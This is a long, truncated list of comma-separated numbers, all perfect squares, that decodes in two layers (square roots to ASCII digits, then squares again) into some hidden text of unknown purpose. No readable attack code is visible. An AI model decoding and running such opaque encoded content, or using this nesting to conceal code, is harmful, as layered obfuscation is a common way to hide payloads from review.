401,2916,2304,2304,1936,2401,2809,2500,2401,1936,2401,2401,3136,3136,2401,1936,3025,2809,2916,3249,1936,2809,2916,2500,2809,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,3249,2916,2304,2704,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3249,2916,2304,2704,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,2601,2401,2601,2916,1936,2401,2704,3136,3136,2704,1936,3249,2916,2304,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2601,2401,2601,2916,1936,2401,2704,2401,2916,2401,1936,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2401,2809,2916,1936,2401,2601,3249,2500,2704,1936,2401,2401,2916,2916,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,3025,3025,2704,2704,1936,2809,2601,2500,3249,1936,2401,2304,2500,2304,2401,1936,3249,3136,2304,2401,1936,2500,3025,2304,2704,1936,2500,3249,2401,2916,1936,2500,3025,2304,2704,1936,2809,2601,2500,3249,1936,2401,2401,2916,2916,2704,1936,2401,2601,3249,2500,2704,1936,2916,2809,2916,2401,1936,3025,3025,2704,2704,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2401,2601,3249,2500,2704,1936,2401,2401,2916,2916,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,3025,3025,2704,2704,1936,2809,2601,2500,3249,1936,2401,2304,2500,2304,2401,1936,2916,2809,2916,2401,1936,2500,3249,2401,2916,1936,2401,2304,2500,2304,2401,1936,2401,2304,2500,2304,2401,1936,2401,2601,2500,2500,2809,1936,3249,3136,2304,2401,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,3249,3136,2304,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2401,2601,3249,2500,2704,1936,2401,2401,2916,2916,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,3025,3025,2704,2704,1936,2809,2601,2500,3249,1936,2809,2601,2500,3249,1936,2500,3025,2304,2704,1936,2401,2304,2500,2304,2401,1936,2401,2601,3249,2500,2704,1936,2809,2601,2500,3249,1936,2401,2601,2500,2500,2809,1936,2809,2601,2500,3249,1936,2500,3249,2401,2916,1936,2401,2601,3249,2500,2704,1936,2500,3249,2401,2916,1936,2401,2401,2809,2916,1936,3136,2916,2704,3249,1936,2401,2304,2500,2704,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,3025,2809,2916,3249,1936,2401,2500,2809,2704,2704,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2401,2401,3136,3136,2401,1936,3025,2809,2916,3249,1936,2601,2401,2601,2916,1936,2601,2401,2601,2916,1936,2809,2304,2704,2401,1936,3025,2601,3249,2916,1936,2704,3249,2304,2304,1936,2401,2704,2401,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2704,3136,3136,2704,1936,3136,2401,2304,2304,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,3025,2601,3249,2916,1936,2401,2304,2304,2304,2304,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,3249,2916,2304,2704,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,3249,2304,2500,2809,1936,2704,2916,2500,2704,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,2601,2304,2500,2809,1936,2401,2401,2704,2704,3249,1936,2500,2601,2304,2704,1936,2916,3025,2500,2704,1936,2704,2916,2500,2704,1936,2401,2500,3249,3249,2916,1936,2500,2601,2304,2704,1936,2704,2916,2500,2704,1936,2704,2916,2500,2704,1936,3025,2809,2916,3249,1936,2704,2601,2809,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,3025,2809,2916,3249,1936,2401,2601,2916,3136,3249,1936,3025,2809,2916,3249,1936,2601,2500,2704,3249,1936,2704,2916,2500,2704,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2401,2809,2916,1936,3249,2304,2500,2809,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2704,2916,2500,2704,1936,2704,2916,2500,2704,1936,3025,2809,2916,3249,1936,2704,2601,2809,2916,1936,2500,2601,2304,2704,1936,2401,2401,2809,2916,1936,3136,2916,2704,3249,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,3136,2500,3136,2401,1936,3249,2304,2500,2809,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2704,2916,2500,2704,1936,2704,2916,2500,2704,1936,3025,2809,2916,3249,1936,2704,2601,2809,2916,1936,2500,2601,2304,2704,1936,3136,2916,2704,3249,1936,2401,3249,2601,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2704,2401,2916,2401,1936,3249,2916,2304,2704,1936,2401,2916,2304,2304,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2401,2500,2401,2304,2304,1936,2916,3025,2500,2704,1936,2809,2916,2500,2809,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,3249,2916,2304,2704,1936,2401,2704,2401,2916,2401,1936,2601,2401,2601,2916,1936,2601,2304,2500,2809,1936,2401,2304,2704,2304,2704,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2401,2304,2500,2704,1936,2916,2809,2916,2401,1936,3025,3025,2704,2704,1936,2401,2601,2500,2500,2809,1936,2401,2916,3136,2401,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,3025,2601,3249,2916,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2304,2304,2304,1936,2401,2704,2401,2916,2401,1936,2601,2401,2601,2916,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2704,2916,2500,2704,1936,2704,2916,2500,2704,1936,3025,2809,2916,3249,1936,2704,2601,2809,2916,1936,2500,2601,2304,2704,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,2500,2601,2304,2704,1936,2809,2916,2500,2809,1936,2704,2916,2500,2704,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2809,2304,2704,2401,1936,2401,2704,2916,2704,2401,1936,2704,3025,2916,2401,1936,2401,2500,2401,2304,2304,1936,2916,3025,2500,2704,1936,2809,2916,2500,2809,1936,2809,2916,2500,2809,1936,2401,3249,2601,2916,1936,3249,2304,2500,2809,1936,3025,2601,3249,2916,1936,2401,2304,2304,2304,2304,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2401,2304,2500,2704,1936,2704,2916,2500,2704,1936,2500,2601,2304,2704,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,2401,2401,3136,3136,2401,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,3249,3136,2304,2401,1936,3136,2916,2704,3249,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,3025,2809,2916,3249,1936,2809,2916,2500,2809,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,2500,2704,2304,2401,1936,3025,2500,2500,2809,1936,2401,2601,2704,2809,2916,1936,3249,2304,2500,2809,1936,3249,2916,2304,2704,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,3249,2304,2500,2809,1936,2704,2916,2500,2704,1936,2401,2304,2304,2304,2304,1936,2809,2304,2704,2401,1936,2401,2500,2809,2704,2704,1936,2401,2401,2500,2601,2916,1936,2916,3025,2500,2704,1936,2401,2601,2916,3136,3249,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2809,2304,2704,2401,1936,2401,2601,2916,3136,3249,1936,2401,2401,2304,2500,2809,1936,2500,2601,2304,2704,1936,2500,2601,2304,2704,1936,2601,2304,2500,2809,1936,2401,2704,2916,2704,2401,1936,3025,2809,2916,3249,1936,2401,2401,3136,3136,2401,1936,2401,2704,3136,3136,2704,1936,2401,2500,3249,3249,2916,1936,2500,2601,2304,2704,1936,2704,2916,2500,2704,1936,2704,2916,2500,2704,1936,3025,2809,2916,3249,1936,2704,2601,2809,2916,1936,2500,2601,2304,2704,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,3136,2916,2704,3249,1936,2401,2304,2500,2704,1936,2401,2601,2916,3136,3249,1936,2500,2601,2304,2704,1936,2601,2500,2704,3249,1936,2809,2304,2704,2401,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,3136,2401,2916,1936,2916,2304,3136,2704,1936,2500,2601,2304,2704,1936,2401,2401,3136,3136,2401,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2401,2809,2916,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,3025,2809,2916,3249,1936,2401,2500,2809,2704,2704,1936,2601,2401,2601,2916,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,3249,2304,2500,2809,1936,2500,2809,2304,2304,1936,2500,2601,2304,2704,1936,2916,3025,2500,2704,1936,2704,2916,2500,2704,1936,2704,2500,2500,2809,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2704,2916,2500,2704,1936,3136,2916,2704,3249,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,3249,2916,2304,2704,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,3249,2304,2500,2809,1936,2401,2401,3136,3136,2401,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,2401,2401,3136,3136,2401,1936,2401,2704,3136,3136,2704,1936,2401,2401,2304,2500,2809,1936,2809,2304,2704,2401,1936,2401,2601,2916,3136,3249,1936,2401,2401,2500,2601,2916,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2704,2916,2500,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2401,2500,2601,2916,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,2401,2401,3136,3136,2401,1936,2401,2704,3136,3136,2704,1936,2401,2304,2500,2704,1936,3249,2916,2304,2704,1936,2809,2304,2704,2401,1936,2401,2601,2916,3136,3249,1936,2401,2304,2500,2704,1936,2500,2601,2304,2704,1936,2809,2401,3136,2704,1936,2401,2704,2401,2916,2401,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2704,2916,2500,2704,1936,2401,2401,2809,2916,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2500,2809,2304,2304,1936,2500,2601,2304,2704,1936,2916,3025,2500,2704,1936,2704,2916,2500,2704,1936,2704,2500,2500,2809,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2704,2916,2500,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,3025,2809,2916,3249,1936,2809,2916,2500,2809,1936,2809,2916,2500,2809,1936,2704,2500,2500,2809,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2704,2916,2500,2704,1936,2401,2304,2500,2704,1936,2704,2916,2500,2704,1936,2500,2601,2304,2704,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,2401,2401,3136,3136,2401,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2304,3136,3249,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2401,2500,2401,2304,2304,1936,2916,3025,2500,2704,1936,2809,2916,2500,2809,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,2704,2601,2809,2916,1936,2500,2601,2304,2704,1936,3025,2601,3249,2916,1936,2916,3136,3136,3249,1936,2704,2916,2500,2704,1936,2704,2916,2500,2704,1936,2401,2704,2401,2916,2401,1936,2704,2601,2809,2916,1936,2601,2401,2601,2916,1936,2500,2601,2304,2704,1936,2601,2304,2500,2809,1936,2401,2401,2500,2601,2916,1936,2916,3025,2500,2704,1936,2401,2601,2916,3136,3249,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2809,2304,2704,2401,1936,2401,2601,2916,3136,3249,1936,3136,2401,2304,2304,1936,2809,2304,2704,2401,1936,2704,2601,2809,2916,1936,2401,2704,2401,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2916,2304,3136,2704,1936,2401,2916,3136,2401,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2401,2500,2601,2916,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,2401,2401,3136,3136,2401,1936,2401,2704,3136,3136,2704,1936,2401,2304,2500,2704,1936,3249,2916,2304,2704,1936,2809,2304,2704,2401,1936,2401,2601,2916,3136,3249,1936,2401,2304,2500,2704,1936,2401,2401,2704,2704,3249,1936,2500,2601,2304,2704,1936,2916,3025,2500,2704,1936,2704,2916,2500,2704,1936,2401,2401,2809,2916,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2916,2500,2809,1936,2809,2304,2704,2401,1936,2704,2601,2809,2916,1936,2401,2704,2401,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2704,2601,2809,2916,1936,2500,2601,2304,2704,1936,3025,2601,3249,2916,1936,2916,3136,3136,3249,1936,2704,2916,2500,2704,1936,2704,2916,2500,2704,1936,2401,2704,2401,2916,2401,1936,2704,2601,2809,2916,1936,2601,2401,2601,2916,1936,2500,2601,2304,2704,1936,2601,2304,2500,2809,1936,2401,2401,2500,2601,2916,1936,2916,3025,2500,2704,1936,2401,2601,2916,3136,3249,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2809,2304,2704,2401,1936,2401,2601,2916,3136,3249,1936,3136,2401,2304,2304,1936,2809,2304,2704,2401,1936,2704,2601,2809,2916,1936,2401,2704,2401,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2704,2401,2916,2401,1936,3249,2916,2304,2704,1936,2401,2304,2500,2704,1936,2401,2304,3136,3249,1936,2401,2916,2304,2304,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2401,2500,2401,2304,2304,1936,2401,2704,2401,2916,2401,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2916,2704,2401,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,3249,2304,2500,2809,1936,2401,2401,3136,3136,2401,1936,2916,3025,2500,2704,1936,2401,2601,2916,3136,3249,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2809,2304,2704,2401,1936,2401,2601,2916,3136,3249,1936,2401,2401,2809,2916,1936,2401,2304,2500,2704,1936,2401,2704,2704,2704,1936,2401,2704,2704,2704,1936,2401,2304,2500,2704,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2401,2500,2401,2304,2304,1936,2401,2704,2401,2916,2401,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2916,2704,2401,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,3249,2304,2500,2809,1936,2401,2401,3136,3136,2401,1936,2916,3025,2500,2704,1936,2401,2601,2916,3136,3249,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2809,2304,2704,2401,1936,2401,2601,2916,3136,3249,1936,3249,2304,2500,2809,1936,3025,3025,27